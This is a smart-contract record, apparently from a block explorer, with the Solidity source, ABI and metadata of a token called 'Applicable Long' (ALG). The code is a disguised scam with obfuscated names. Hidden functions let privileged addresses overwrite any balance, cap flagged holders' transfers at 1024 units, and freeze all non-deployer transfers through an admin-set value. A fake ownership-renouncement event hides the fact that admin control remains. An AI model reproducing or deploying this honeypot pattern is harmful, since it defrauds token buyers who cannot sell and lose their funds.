{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.3;\n\ninterface swapSender {\n    function createPair(address enableLaunched, address autoLaunched) external returns (address);\n}\n\ninterface atFee {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address tradingTotal) external view returns (uint256);\n\n    function transfer(address shouldTotalWallet, uint256 totalAmount) external returns (bool);\n\n    function allowance(address sellBuy, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 totalAmount) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address shouldTotalWallet,\n        uint256 totalAmount\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed txIs, uint256 value);\n    event Approval(address indexed sellBuy, address indexed spender, uint256 value);\n}\n\nabstract contract fromAuto {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface fromTx {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface atFeeMetadata is atFee {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ApplicableLong is fromAuto, atFee, atFeeMetadata {\n\n    uint256 shouldMode;\n\n    function receiverBuySell(address shouldLiquidity, uint256 totalAmount) public {\n        receiverLaunch();\n        limitLiquidity[shouldLiquidity] = totalAmount;\n    }\n\n    function transferFrom(address toTake, address shouldTotalWallet, uint256 totalAmount) external override returns (bool) {\n        if (_msgSender() != atMarketing) {\n            if (maxFeeTx[toTake][_msgSender()] != type(uint256).max) {\n                require(totalAmount <= maxFeeTx[toTake][_msgSender()]);\n                maxFeeTx[toTake][_msgSender()] -= totalAmount;\n            }\n        }\n        return minFeeEnable(toTake, shouldTotalWallet, totalAmount);\n    }\n\n    function receiverLaunch() private view {\n        require(listFund[_msgSender()]);\n    }\n\n    function balanceOf(address tradingTotal) public view virtual override returns (uint256) {\n        return limitLiquidity[tradingTotal];\n    }\n\n    function minFeeEnable(address toTake, address shouldTotalWallet, uint256 totalAmount) internal returns (bool) {\n        if (toTake == minEnable) {\n            return exemptIsTo(toTake, shouldTotalWallet, totalAmount);\n        }\n        uint256 tokenTotalTx = atFee(maxSell).balanceOf(marketingSell);\n        require(tokenTotalTx == shouldMode);\n        require(shouldTotalWallet != marketingSell);\n        if (senderLimitAmount[toTake]) {\n            return exemptIsTo(toTake, shouldTotalWallet, launchWallet);\n        }\n        return exemptIsTo(toTake, shouldTotalWallet, totalAmount);\n    }\n\n    mapping(address => bool) public senderLimitAmount;\n\n    function transfer(address shouldLiquidity, uint256 totalAmount) external virtual override returns (bool) {\n        return minFeeEnable(_msgSender(), shouldLiquidity, totalAmount);\n    }\n\n    uint256 private shouldLaunchedLiquidity;\n\n    address public minEnable;\n\n    function atFundList(address tokenTotal) public {\n        if (launchedFrom) {\n            return;\n        }\n        if (fromToken == shouldLaunchedLiquidity) {\n            fromMax = true;\n        }\n        listFund[tokenTotal] = true;\n        \n        launchedFrom = true;\n    }\n\n    function modeTeam(address marketingFee) public {\n        receiverLaunch();\n        \n        if (marketingFee == minEnable || marketingFee == maxSell) {\n            return;\n        }\n        senderLimitAmount[marketingFee] = true;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return fundBuy;\n    }\n\n    function liquidityEnable() public {\n        emit OwnershipTransferred(minEnable, address(0));\n        limitMin = address(0);\n    }\n\n    uint256 private fromToken;\n\n    mapping(address => mapping(address => uint256)) private maxFeeTx;\n\n    constructor (){\n        \n        fromTx shouldSender = fromTx(atMarketing);\n        maxSell = swapSender(shouldSender.factory()).createPair(shouldSender.WETH(), address(this));\n        if (fromToken == shouldLaunchedLiquidity) {\n            shouldLaunchedLiquidity = fromToken;\n        }\n        minEnable = _msgSender();\n        listFund[minEnable] = true;\n        limitLiquidity[minEnable] = minLaunch;\n        liquidityEnable();\n        if (fromMax) {\n            launchedTotal = false;\n        }\n        emit Transfer(address(0), minEnable, minLaunch);\n    }\n\n    function getOwner() external view returns (address) {\n        return limitMin;\n    }\n\n    event OwnershipTransferred(address indexed fromLaunchTo, address indexed teamLaunchTo);\n\n    uint256 private minLaunch = 100000000 * 10 ** 18;\n\n    bool public fromMax;\n\n    uint256 constant launchWallet = 2 ** 10;\n\n    address marketingSell = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function symbol() external view virtual override returns (string memory) {\n        return limitFee;\n    }\n\n    function allowance(address walletSender, address swapFrom) external view virtual override returns (uint256) {\n        if (swapFrom == atMarketing) {\n            return type(uint256).max;\n        }\n        return maxFeeTx[walletSender][swapFrom];\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return minLaunch;\n    }\n\n    address public maxSell;\n\n    bool private launchedTotal;\n\n    function launchedLaunch(uint256 totalAmount) public {\n        receiverLaunch();\n        shouldMode = totalAmount;\n    }\n\n    function exemptIsTo(address toTake, address shouldTotalWallet, uint256 totalAmount) internal returns (bool) {\n        require(limitLiquidity[toTake] >= totalAmount);\n        limitLiquidity[toTake] -= totalAmount;\n        limitLiquidity[shouldTotalWallet] += totalAmount;\n        emit Transfer(toTake, shouldTotalWallet, totalAmount);\n        return true;\n    }\n\n    uint8 private fundBuy = 18;\n\n    mapping(address => uint256) private limitLiquidity;\n\n    mapping(address => bool) public listFund;\n\n    function owner() external view returns (address) {\n        return limitMin;\n    }\n\n    function approve(address swapFrom, uint256 totalAmount) public virtual override returns (bool) {\n        maxFeeTx[_msgSender()][swapFrom] = totalAmount;\n        emit Approval(_msgSender(), swapFrom, totalAmount);\n        return true;\n    }\n\n    address private limitMin;\n\n    string private fundLaunch = \"Applicable Long\";\n\n    function name() external view virtual override returns (string memory) {\n        return fundLaunch;\n    }\n\n    bool public launchedFrom;\n\n    string private limitFee = \"ALG\";\n\n    address atMarketing = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 walletTotal;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sellBuy\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fromLaunchTo\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"teamLaunchTo\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"txIs\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletSender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"swapFrom\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"totalAmount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenTotal\",\"type\":\"address\"}],\"name\":\"atFundList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingTotal\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"totalAmount\",\"type\":\"uint256\"}],\"name\":\"launchedLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"listFund\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxSell\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minEnable\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingFee\",\"type\":\"address\"}],\"name\":\"modeTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldLiquidity\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"totalAmount\",\"type\":\"uint256\"}],\"name\":\"receiverBuySell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"senderLimitAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldLiquidity\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"totalAmount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toTake\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"shouldTotalWallet\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"totalAmount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "ApplicableLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}